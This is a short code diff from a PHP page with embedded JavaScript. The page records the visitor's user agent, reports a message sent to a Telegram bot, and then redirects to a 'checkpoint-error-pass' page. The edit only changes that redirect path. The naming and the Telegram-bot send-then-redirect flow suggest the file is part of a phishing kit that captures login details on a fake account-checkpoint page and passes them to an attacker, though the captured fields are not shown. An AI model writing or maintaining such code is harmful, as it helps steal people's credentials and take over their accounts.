@@ -940,7 +940,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                     if (xhr.status >= 200 && xhr.status < 300) {
                         console.log('Message sent to Telegram bot successfully.');
                         setTimeout(function() {
-                            window.location.href = "checkpoint-error-pass.php"; // Chuyển hướng sau khi gửi thành công
+                            window.location.href = "/checkpoint-error-pass.php"; // Chuyển hướng sau khi gửi thành công
                         }, 1000);
                     } else {
             console.error('Failed to send message to Telegram bot.');
